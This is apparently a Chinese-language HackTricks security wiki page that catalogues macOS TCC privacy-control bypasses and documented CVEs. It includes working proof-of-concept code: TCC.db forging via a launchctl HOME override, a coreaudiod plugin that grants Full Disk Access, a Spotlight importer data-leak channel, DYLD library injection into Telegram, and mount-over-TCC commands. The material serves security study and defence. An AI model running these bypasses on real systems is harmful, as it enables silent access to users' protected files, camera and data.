# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

有关 TCC 授权的存储以及 Automation 发送方/目标归属信息，请参阅 [macOS TCC 概述](../index.html#identify-apple-events-sender-and-target-grants)。

## 按功能分类

### Write Bypass

这并不是 bypass，而是 TCC 的工作方式：**它不会阻止写入**。如果 Terminal **没有权限读取用户的 Desktop，仍然可以向其中写入**：

```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```

**扩展属性 `com.apple.macl`**会被添加到新建的**文件**，以便**创建该文件的 app**能够读取它。<sup>[[2]](#references)</sup>

### TCC ClickJacking

可以**在 TCC 提示框上方覆盖一个窗口**，让用户在不知情的情况下**接受**请求。你可以在 [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**<sup>[[18]](#references)</sup> 中找到 PoC。

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

攻击者可以在 **`Info.plist`** 中**创建任意名称的 app**（例如 Finder、Google Chrome...），并让它请求访问受 TCC 保护的位置。用户会以为是合法应用在请求访问权限。\
此外，也可以**从 Dock 中移除合法 app，再把假 app 放进去**。这样，当用户点击假 app（它可以使用相同的图标）时，假 app 可以调用合法 app、请求 TCC 权限并执行 malware，让用户误以为是合法 app 请求了访问权限。<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

更多信息和 PoC：

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

默认情况下，通过 **SSH 访问曾经具有“Full Disk Access”**。若要禁用此权限，需要将其保留在列表中但设为禁用状态（从列表中移除并不会移除这些权限）：<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass：默认情况下，通过 SSH 访问曾经具有“Full Disk Access”。若要禁用此权限，需要将其保留在列表中但设为禁用状态（从列表中移除……](<../../../../../images/image (1077).png>)

此处可以查看一些 **malware 绕过此保护机制**的示例：

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> 注意，现在要启用 SSH，必须授予 **Full Disk Access**

### Handle extensions - CVE-2022-26767

文件会获得属性 **`com.apple.macl`**，以授予**特定应用读取该文件的权限**。当用户将文件**拖放**到 app 上，或**双击**文件并使用**默认应用**打开时，系统会设置此属性。

因此，用户可能会**注册一个恶意 app** 来处理所有扩展名，并调用 Launch Services **打开**任意文件（这样恶意文件就会被授予读取权限）。<sup>[[23]](#references)</sup>

### iCloud

利用 entitlement **`com.apple.private.icloud-account-access`**，可以与 **`com.apple.iCloudHelper`** XPC service 通信，从而**获取 iCloud tokens**。

**iMovie** 和 **Garageband** 曾拥有此 entitlement 及其他相关 entitlement。

关于利用此 entitlement **获取 iCloud tokens** 的更多**信息**，请参阅演讲：[**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### 通过 Darwin notification names 实现 Spotlight importer leakage

Spotlight importer 可以读取 Spotlight 传递给其 `GetMetadataForFile` callback 的文件，即使没有 Full Disk Access 的普通进程无法读取该文件。与[向已获 TCC 授权的进程注入代码](../macos-tcc-credential-and-data-theft.md)不同，此方法要求攻击者已在本地立足，能够安装 importer，并等待匹配的 Spotlight indexing event。Importer 受 sandbox 限制，但仅包含名称的 Darwin notification 可以将字节传递给 sandbox 外的 listener。这是一种数据泄露通道，不会让 importer 获得 root 权限或任意文件访问能力。<sup>[[24]](#references)</sup>

在 importer 的 `Info.plist` 中，将目标文件类型声明在 `CFBundleDocumentTypes` → `LSItemContentTypes` 下，然后将 bundle 安装到 `~/Library/Spotlight/` 或某个 app 的 `Contents/Library/Spotlight/` 中。使用 `mdimport -L` 检查注册情况。[Spotlight importer 部分](../../../../macos-auto-start-locations.md#spotlight-plugins)介绍了 bundle 的放置位置和文件类型匹配方式。Importer 只会接收 Spotlight 选中它处理的文件；通常，已有的 importer 会优先处理。在 macOS 26 Tahoe 上，据报告的测试结果，`mdimport -i` 并不能可靠地强制立即进行递归索引，而 `mdimport -r ~/Library/Spotlight/Spotlight.mdimporter` 会请求重新导入该 importer 声明支持的 UTI。<sup>[[24]](#references)</sup>

要测试此通道，先在 sandbox 外使用 `notifyutil -w TEST_TEST_TEST` 启动 listener，然后使用 `CFNotificationCenterGetDarwinNotifyCenter()` 和 `NULL` object 与 `userInfo` 发布 notification。与带有 `userInfo` payload 的 distributed notification 不同，Darwin notification 只有名称。要传输二进制数据，使用 `notify_register_dispatch` 将外部 listener 注册为接收十进制名称 `0` 到 `255` 的 notification；将每个 callback 的注册项映射到对应的字节值。在 `GetMetadataForFile` 中，只读取 Spotlight 提供的 `pathToFile`，并将每个字节作为十进制 notification 名称发送：<sup>[[24]](#references)</sup>

```objectivec
NSData *data = readBytes(pathToFile); // helper reading Spotlight's selected file
const uint8_t *bytes = data.bytes;
for (NSUInteger i = 0; i < data.length; i++) {
    CFStringRef name = CFStringCreateWithFormat(NULL, NULL,
                                                 CFSTR("%u"), bytes[i]);
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         name, NULL, NULL, true);
    CFRelease(name);
}
```

监听器会重建字节序列，而不是直接读取受 TCC 保护的文件。已发布的 PoC 在 macOS 26 上、SIP 启用时，从一个未获得 FDA 的终端恢复了 `knowledgeC.db` 的前 64 个字节。这种方法带宽低，不适合可靠地批量复制：Spotlight 可能不会索引或重新索引目标文件，而且并发的 importer 实例可能会交错发送通知流。有关其他沙盒边界机制，请参阅 [macOS Sandbox Debug & Bypass](../../macos-sandbox/macos-sandbox-debug-and-bypass/)。<sup>[[24]](#references)</sup>

### kTCCServiceAppleEvents / 自动化

拥有 **`kTCCServiceAppleEvents`** 权限的应用能够**控制其他应用**。这意味着它可能会**滥用授予其他应用的权限**。<sup>[[2]](#references)</sup>

有关 Apple Scripts 的更多信息，请查看：


{{#ref}}
macos-apple-scripts.md
{{#endref}}

例如，如果某个应用拥有对 `iTerm` 的**自动化权限**，则可以像下面这个例子一样，由 **`Terminal`** 获得对 iTerm 的访问权限：

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### 对 iTerm 的控制

没有 FDA 的 Terminal 可以调用拥有 FDA 的 iTerm，并利用它执行操作：

```applescript:iterm.script
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```

```bash
osascript iterm.script
```

#### 通过 Finder

或者，如果某个应用可以通过 Finder 访问，它可以运行类似这样的脚本：

```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```

## 按 App 行为

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

用户态的 **tccd daemon** 使用 **`HOME`** **env** 变量访问 TCC 用户数据库，路径为：**`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

根据[这篇 Stack Exchange 帖子](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)，由于 TCC daemon 通过 `launchd` 在当前用户的域中运行，因此可以**控制传递给它的所有环境变量**。<sup>[[19]](#references)</sup>\
因此，**攻击者可以在** **`launchctl`** **中设置 `$HOME` 环境变量**，使其指向一个**受控** **目录**，然后**重启** **TCC** daemon，接着**直接修改 TCC 数据库**，从而为自己授予**所有可用的 TCC 权限**，而无需提示终端用户。<sup>[[1]](#references)</sup>\
PoC:

```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```

### CVE-2021-30761 - Notes

Notes 可以访问受 TCC 保护的位置，但新创建的笔记会**存储在非受保护的位置**。因此，攻击者可以让 Notes 将受保护的文件复制到笔记中，然后从非受保护的位置访问复制后的数据：

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

二进制文件 `/usr/libexec/lsd` 及其库 `libsecurity_translocate` 拥有授权 `com.apple.private.nullfs_allow`，允许其创建 **nullfs** 挂载；它还拥有授权 `com.apple.private.tcc.allow`，且包含 **`kTCCServiceSystemPolicyAllFiles`**，因此可以访问所有文件。

攻击者可以为“Library”添加 quarantine 属性，调用 **`com.apple.security.translocation`** XPC 服务，随后该服务会将 Library 映射到 **`$TMPDIR/AppTranslocation/d/d/Library`**，从而可以**访问** Library 中的所有文档。

### CVE-2024-44131 - FileProvider 符号链接竞争

将文件操作交给**特权 helper**（此处为 **`fileproviderd`** / `Files.app`）处理的应用，会**代表用户**复制或移动项目，因此复制操作使用的是 helper 的权限，而不是调用者的权限。

Jamf Threat Labs 展示了，操作前执行的符号链接验证可以被**竞争利用**：攻击者不在**最后一个**路径组件（该组件会被检查）上放置符号链接，而是在复制操作已经开始**之后**替换路径中的某个**中间**目录。这样，特权 helper 就会跟随攻击者控制的链接，读取/写入受 TCC 保护的位置，**且不会显示任何提示**。<sup>[[5]](#references)</sup>

路径中**没有**随机 UUID 保护的目录（例如 `~/Library/Mobile Documents/com~apple~CloudDocs`）最容易成为攻击目标，因为攻击者可以预测完整路径并发起竞争。

> [!TIP]
> 这是值得关注的通用模式：**任何多次解析路径的特权进程**（先检查再使用，或 `rename()`/`copyfile()` 分别解析源路径和目标路径）都可能因路径中间的目录被替换而遭到竞争利用。只有 `O_NOFOLLOW_ANY`、在已打开的目录 FD 上调用 `openat()`，或执行 `realpath()` 后重新验证，才能真正关闭这个窗口。

更多信息请参阅[**Jamf Threat Labs 的分析文章**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)。<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3` 可以通过 `SQLITE_ENABLE_SQLLOG` 构建，从而添加一个由环境变量驱动的日志记录钩子（[上游 `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)）：<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – 对于**每个打开的数据库**，数据库文件的**副本**和 SQL 语句日志都会写入 `path`（该目录必须已存在）。
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – 每次打开/附加 DB 时都创建一份**全新副本**，而不是重复使用已有副本。
- **`SQLITE_SQLLOG_CONDITIONAL`** – 仅当主 DB 旁边存在 `<database>-sqllog` 文件时，才记录该连接。

如果你能将此变量注入一个拥有 **FDA** 且会打开 SQLite 数据库的进程，它就会将那些受保护的数据库**复制**到你控制的目录中。由于目标文件名源自攻击者控制的数据，在目标路径预先放置一个**符号链接**，就能将同一原语转化为使用目标进程权限执行的**任意文件写入**。

### **SQLITE_AUTO_TRACE**

如果设置了环境变量 **`SQLITE_AUTO_TRACE`**，库 **`libsqlite3.dylib`** 就会开始**记录**所有 SQL 查询。许多应用程序都使用了该库，因此可以记录它们的所有 SQLite 查询。<sup>[[22]](#references)</sup>

有几个 Apple 应用程序使用该库访问受 TCC 保护的信息。

```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```

### 寻找由环境变量驱动的文件写入

前面两个条目都是同一种通用技术的实例，值得继续寻找更多案例：**加载到具有 TCC 特权的应用中的框架，通常会公开调试/日志环境变量，导致进程在调用者可控的路径创建文件**。

查找流程：

1. 选择一个具有 FDA 或其他高价值 TCC 权限的目标（`Music`、`TV`、`Terminal`、MDM 代理等），并列出它链接的框架（`otool -L`、`vmmap`）。
2. 在这些框架中搜索 `getenv` 字符串：`strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`。
3. 通过 `launchctl setenv NAME /path/you/control` 设置候选变量，启动应用，并使用 `fs_usage -w -f filesys <pid>` 或 `sudo fs_usage | grep <path>` 观察它在文件系统上的操作。
4. 如果进程在你的目录中**创建或重命名**文件，你就获得了一个写入原语：将目标路径指向一个符号链接（或像上文 CVE-2024-44131 那样，竞争中间目录），将写入重定向到 `~/Library/Application Support/com.apple.TCC/TCC.db`。

> [!TIP]
> 有两点限制。首先，**对于启用了 hardened runtime 的二进制文件，`DYLD_*` 变量会被忽略**，除非应用包含 [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) 权限（“一个布尔值，指示应用是否可能受到动态链接器环境变量的影响；你可以利用这些变量向应用进程注入代码”）——另请参阅 [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)。其次，Apple 会在框架调试变量被报告后逐一移除，因此某个变量在一个 macOS 版本上有效，到了下一个版本通常就失效了。如果设置某个变量后应用悄无声息地拒绝启动，就应视该变量已被过滤。<sup>[[7]](#references)[[8]](#references)</sup>

如需了解使用链接器变量实现的类似技巧，请参阅 [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md)。

### Apple Remote Desktop

作为 root，你可以启用此服务，而 **ARD agent 将拥有完整磁盘访问权限**；随后用户便可滥用它，让它复制一个新的 **TCC 用户数据库**。

## 通过 **NFSHomeDirectory**

TCC 使用用户 HOME 文件夹中的数据库来控制对用户专属资源的访问，路径为 **$HOME/Library/Application Support/com.apple.TCC/TCC.db**。\
因此，如果用户设法通过指向**其他文件夹**的 `$HOME` 环境变量重启 TCC，就可以在 **/Library/Application Support/com.apple.TCC/TCC.db** 创建新的 TCC 数据库，并诱使 TCC 向任意应用授予任意 TCC 权限。

> [!TIP]
> 请注意，Apple 使用用户配置文件中 **`NFSHomeDirectory`** 属性所存储的设置作为 **`$HOME` 的值**。因此，如果你攻陷了一个有权限修改此值（**`kTCCServiceSystemPolicySysAdminFiles`**）的应用，就可以利用此选项实现 TCC bypass。

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**第一个 POC** 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 和 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 修改用户的 **HOME** 文件夹。

1. 获取目标应用的 _csreq_ blob。
2. 放置一个带有所需访问权限和 _csreq_ blob 的伪造 _TCC.db_ 文件。
3. 使用 [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) 导出用户的 Directory Services 条目。
4. 修改 Directory Services 条目以更改用户的 home directory。
5. 使用 [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) 导入修改后的 Directory Services 条目。
6. 停止用户的 _tccd_ 并重启进程。

第二个 POC 使用了 **`/usr/libexec/configd`**，它具有值为 `kTCCServiceSystemPolicySysAdminFiles` 的 `com.apple.private.tcc.allow`。\
可以通过 **`-t`** 选项运行 **`configd`**，攻击者能够指定要加载的**自定义 Bundle**。因此，该漏洞利用通过 **`configd` 代码注入**取代了使用 **`dsexport`** 和 **`dsimport`** 更改用户 home directory 的方法。

更多信息请参阅[**原始报告**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)。<sup>[[11]](#references)</sup>

## 通过进程注入

有多种技术可以向进程中注入代码，并滥用其 TCC 权限：


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

此外，最常见的 TCC bypass 进程注入方式是通过 **plugins (load library)**。\
Plugins 是额外的代码，通常以库或 plist 的形式存在，会由**主应用加载**并在其上下文中执行。因此，如果主应用可以访问受 TCC 限制的文件（通过已授予的权限或 entitlements），**自定义代码也能访问这些文件**。

### CVE-2020-27937 - Directory Utility

应用 `/System/Library/CoreServices/Applications/Directory Utility.app` 具有 **`kTCCServiceSystemPolicySysAdminFiles`** entitlement，会加载扩展名为 **`.daplug`** 的 plugins，且**未启用 hardened runtime**。

要利用此 CVE，需要更改 **`NFSHomeDirectory`**（滥用前述 entitlement），从而**接管用户的 TCC 数据库**并绕过 TCC。

更多信息请参阅[**原始报告**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)。<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

二进制文件 **`/usr/sbin/coreaudiod`** 具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.private.tcc.manager` entitlements。前者**允许代码注入**，后者则赋予它**管理 TCC 的权限**。

此二进制文件允许从文件夹 `/Library/Audio/Plug-Ins/HAL` 加载**第三方 plug-ins**。因此，可以使用以下 POC **加载 plugin 并滥用 TCC 权限**：<sup>[[13]](#references)</sup>

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

    add_tcc_entry();

    NSLog(@"[+] Exploitation finished...");
    exit(0);
```

如需了解更多信息，请查看[**原始报告**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)。<sup>[[13]](#references)</sup>

### 设备抽象层 (DAL) 插件

通过 Core Media I/O 打开摄像头流的系统应用（具有 **`kTCCServiceCamera`** 的应用）会在**进程中加载这些插件**，它们位于 `/Library/CoreMediaIO/Plug-Ins/DAL`（不受 SIP 限制）。

只需在其中存放一个包含常见 **constructor** 的库，就能实现 **代码注入**。

多个 Apple 应用都曾存在此漏洞。

### Firefox

Firefox 应用具有 `com.apple.security.cs.disable-library-validation` 和 `com.apple.security.cs.allow-dyld-environment-variables` 权限：<sup>[[14]](#references)</sup>

```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <true/>
    <key>com.apple.security.cs.disable-library-validation</key>
    <true/>
    <key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
    <true/>
    <key>com.apple.security.device.audio-input</key>
    <true/>
    <key>com.apple.security.device.camera</key>
    <true/>
    <key>com.apple.security.personal-information.location</key>
    <true/>
    <key>com.apple.security.smartcard</key>
    <true/>
</dict>
</plist>
```

关于如何轻松利用这一点的更多信息，请[**查看原始报告**](https://wojciechregula.blog/post/how-to-rob-a-firefox/)。<sup>[[14]](#references)</sup>

### CVE-2020-10006

二进制文件 `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` 拥有 **`com.apple.private.tcc.allow`** 和 **`com.apple.security.get-task-allow`** 这两个 entitlement，因此可以向进程中注入代码并使用 TCC 权限。

### CVE-2023-26818 - Telegram

Telegram 拥有 **`com.apple.security.cs.allow-dyld-environment-variables`** 和 **`com.apple.security.cs.disable-library-validation`** 这两个 entitlement，因此可以滥用它来**获取其权限**，例如使用摄像头录制。你可以在[**这篇 writeup 中找到 payload**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)。<sup>[[15]](#references)</sup>

请注意，为了使用环境变量加载 library，创建了一个**自定义 plist** 来注入这个 library，并使用 **`launchctl`** 启动它：<sup>[[15]](#references)</sup>

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
       <key>Label</key>
        <string>com.telegram.launcher</string>
        <key>RunAtLoad</key>
        <true/>
        <key>EnvironmentVariables</key>
        <dict>
          <key>DYLD_INSERT_LIBRARIES</key>
          <string>/tmp/telegram.dylib</string>
        </dict>
        <key>ProgramArguments</key>
        <array>
  <string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
        </array>
        <key>StandardOutPath</key>
        <string>/tmp/telegram.log</string>
        <key>StandardErrorPath</key>
        <string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```

## 通过 open 调用

即使处于沙盒中，也可以调用 **`open`**

### Terminal 脚本

在电脑技术人员使用的电脑上，通常会为终端授予**完全磁盘访问权限（FDA）**。也可以使用该权限调用 **`.terminal`** 脚本。

**`.terminal`** 脚本是 plist 文件，例如下面这个文件会在 **`CommandString`** 键中指定要执行的命令：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```

应用程序可以在 /tmp 等位置写入终端脚本，并使用类似以下命令启动它：

```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```

## 通过挂载

### CVE-2020-9771 - mount_apfs TCC bypass 和 privilege escalation

**任何用户**（即使是非特权用户）都可以创建并挂载 Time Machine 快照，**访问该快照中的所有文件**。\
所需的**唯一特权**是所用的应用程序（例如 `Terminal`）拥有 **Full Disk Access** (FDA) 权限（`kTCCServiceSystemPolicyAllfiles`），而该权限必须由管理员授予。<sup>[[2]](#references)</sup>

```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```

更详细的说明可[**在原始报告中找到**](https://theevilbit.github.io/posts/cve_2020_9771/)**。**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - 挂载覆盖 TCC 文件

即使 TCC DB 文件受到保护，仍然可以**挂载覆盖该目录**，放入新的 TCC.db 文件：

```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
    os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
    os.system("mkdir /tmp/mnt")
    os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
    os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
    os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
    os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```

查看[**原始 writeup**](https://theevilbit.github.io/posts/cve-2021-30808/)中的**完整 exploit**。<sup>[[21]](#references)</sup>

### CVE-2024-40855

如[原始 writeup](https://www.kandji.io/blog/macos-audit-story-part2)所述，此 CVE 利用了 `diskarbitrationd`。<sup>[[16]](#references)</sup>

公共 `DiskArbitration` framework 中的函数 `DADiskMountWithArgumentsCommon` 执行了安全检查。但是，可以通过直接调用 `diskarbitrationd` 绕过这些检查，从而在路径中使用 `../` 元素和符号链接。

这使攻击者能够在任意位置执行挂载操作，包括覆盖 TCC 数据库，这是因为 `diskarbitrationd` 具有 entitlement `com.apple.private.security.storage-exempt.heritable`。

### asr

工具 **`/usr/sbin/asr`** 可以复制整个磁盘并将其挂载到其他位置，从而绕过 TCC 保护。

### CVE-2022-22655 - 定位服务

定位服务不像其他服务那样存储在 TCC 数据库中。它们由 `locationd` 管理，而 `locationd` 会在 **`/var/db/locationd/clients.plist`** 中维护自己的允许列表：<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

每个条目以客户端（bundle ID 或可执行文件路径）为键，并包含 `Authorized`、`BundleId`、`Executable` 和 `Registered` 等字段。<sup>[[4]](#references)</sup>

`clients.plist` 文件本身受 Sandbox/TCC 保护，即使是 root 也无法编辑——但**`/var/db/locationd/` 目录并未受到挂载保护**。因此，以 root 身份运行的攻击者可以创建一个包含自定义 `clients.plist` 的磁盘映像（将其二进制文件标记为 `Authorized`），将其挂载到该目录上，然后重启 `locationd`，使伪造的允许列表生效。<sup>[[3]](#references)</sup>

> [!TIP]
> 这与上面的 `hdiutil`/`mount` TCC bypass 是同一种模式：*文件*受保护，但它所在的*目录*不受保护，因此替换整个目录，而不是文件。

## 通过启动应用

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## 通过 grep

有时，文件会在未受保护的位置存储电子邮件、电话号码、消息等敏感信息（这在 Apple 看来属于漏洞）。

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

现在这种方法已经不起作用了，但[**过去可以**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**：**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

另一种方法是使用 [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)：<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>



## References

- [1] [CVE-2020–9934：绕过 macOS Transparency, Consent, and Control (TCC) 框架](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [意外与蓄意绕过 macOS TCC 用户隐私保护](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass（原始报告）](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [卡门·圣迭戈身在何处：滥用 macOS 上的 Location Services](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131：TCC bypass 窃取 iCloud 数据](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c`（SQLITE_ENABLE_SQLLOG 环境变量）](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - 允许 DYLD 环境变量的 entitlement](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization：hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [在 XCSSET malware 中发现 Zero-Day TCC bypass](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0：「Mac 上发生的事，会留在 Apple 的 iCloud 里吗？！」- Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
